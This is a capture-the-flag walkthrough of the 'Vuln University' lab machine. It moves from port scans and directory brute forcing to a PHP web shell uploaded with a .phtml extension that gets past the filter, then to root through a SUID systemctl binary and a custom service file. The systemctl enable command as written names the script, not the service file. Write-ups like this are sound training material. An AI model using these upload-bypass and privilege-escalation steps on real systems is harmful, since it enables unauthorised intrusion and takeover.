# Open Ports

```bash
$ masscan -p1-65535 10.10.6.125 --rate=1000 -e tun0 --output-format grepable --output-filename vulnuniversity.masscan

# Masscan 1.3.2 scan initiated Wed Jul 7 02:04:34 2021
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Timestamp: 1625623487 Host: 10.10.6.125 () Ports: 445/open/tcp//microsoft-ds//
Timestamp: 1625623545 Host: 10.10.6.125 () Ports: 3128/open/tcp//unknown//
Timestamp: 1625623578 Host: 10.10.6.125 () Ports: 22/open/tcp//ssh//
Timestamp: 1625623578 Host: 10.10.6.125 () Ports: 21/open/tcp//ftp//
Timestamp: 1625623583 Host: 10.10.6.125 () Ports: 139/open/tcp//netbios-ssn//
Timestamp: 1625623593 Host: 10.10.6.125 () Ports: 3333/open/tcp//unknown//
# Masscan done at Wed Jul 7 02:06:50 2021
```

# Service Enumeration

```bash
$ nmap -sC -sV -O -p139,21,22,3128,3333,445 10.10.6.125 -oA vulnuniversity

Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-06 21:11 CDT
Nmap scan report for 10.10.6.125
Host is up (0.087s latency).

PORT STATE SERVICE VERSION
21/tcp open ftp vsftpd 3.0.3
22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
| 2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)
| 256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)
|_ 256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)
139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3128/tcp open http-proxy Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
3333/tcp open http Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Vuln University
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 3.13 (95%), Linux 5.4 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Sony Android TV (Android 5.0) (92%), Android 5.0 - 6.0.1 (Linux 3.4) (92%), Android 5.1 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h20m47s, deviation: 2h18m34s, median: 47s
|_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
| OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
| Computer name: vulnuniversity
| NetBIOS computer name: VULNUNIVERSITY\\x00
| Domain name: \\x00
| FQDN: vulnuniversity
|_ System time: 2021-07-06T22:13:11-04:00
| smb-security-mode: 
| account_used: guest
| authentication_level: user
| challenge_response: supported
|_ message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
| 2.02: 
|_ Message signing enabled but not required
| smb2-time: 
| date: 2021-07-07T02:13:11
|_ start_date: N/A

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.92 seconds
```

# Web Directory Brute Forcing

```bash
$ gobuster dir -u http://10.10.6.125:3333 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt -x php,txt,html

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url: http://10.10.6.125:3333
[+] Method: GET
[+] Threads: 10
[+] Wordlist: /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt
[+] Negative Status codes: 404
[+] User Agent: gobuster/3.1.0
[+] Extensions: php,txt,html
[+] Timeout: 10s
===============================================================
2021/07/06 21:24:44 Starting gobuster in directory enumeration mode
===============================================================
/images (Status: 301) [Size: 318] [--> http://10.10.6.125:3333/images/]
/index.html (Status: 200) [Size: 33014] 
/css (Status: 301) [Size: 315] [--> http://10.10.6.125:3333/css/] 
/js (Status: 301) [Size: 314] [--> http://10.10.6.125:3333/js/] 
/fonts (Status: 301) [Size: 317] [--> http://10.10.6.125:3333/fonts/] 
/internal (Status: 301) [Size: 320] [--> http://10.10.6.125:3333/internal/]
Progress: 19372 / 326576 (5.93%) ^C
[] Keyboard interrupt detected, terminating.
===============================================================
2021/07/06 21:27:50 Finished
===============================================================
```

Upload files to `/internal` 

# File Upload

## Upload Form

![Pasted image 20210706213315](Pasted%20image%2020210706213315.png)


## Bypass Upload Filter

Apache web server on port 3333, so `PHP` is the focus

Uploads are filtered by extension (`php`, `php2`, etc.), but  `.phtml` is allowed

Upload PHP web shell `tgihf.phtml`

## Successful Web Shell Upload

![Pasted image 20210708233733](Pasted%20image%2020210708233733.png)

---

# Privilege Escalation

## SUID Executables

![Pasted image 20210709210129](Pasted%20image%2020210709210129.png)

`systemctl` is SUID executable and owned by `root`

## Create a Service to Grab the Flag

### Service file (`tgihf.service`)

```
[Unit]
description=tgihf

[Service]
Type=simple
User=root
ExecStart=/dev/shm/tgihf.sh

[Install]
WantedBy=multi-user.target
```

### `Bash` script to grab the flag (`tgihf.sh`)

```
#!/bin/bash
cp /root/root.txt /dev/shm/
```

Save both in `/dev/shm` and set `/dev/shm/tgihf.sh` to executable.

## Enable and Start the Service

```bash
systemctl enable /dev/shm/tgihf.sh
systemctl start tgihf
```

Grab the flag from `/dev/shm/root.txt`.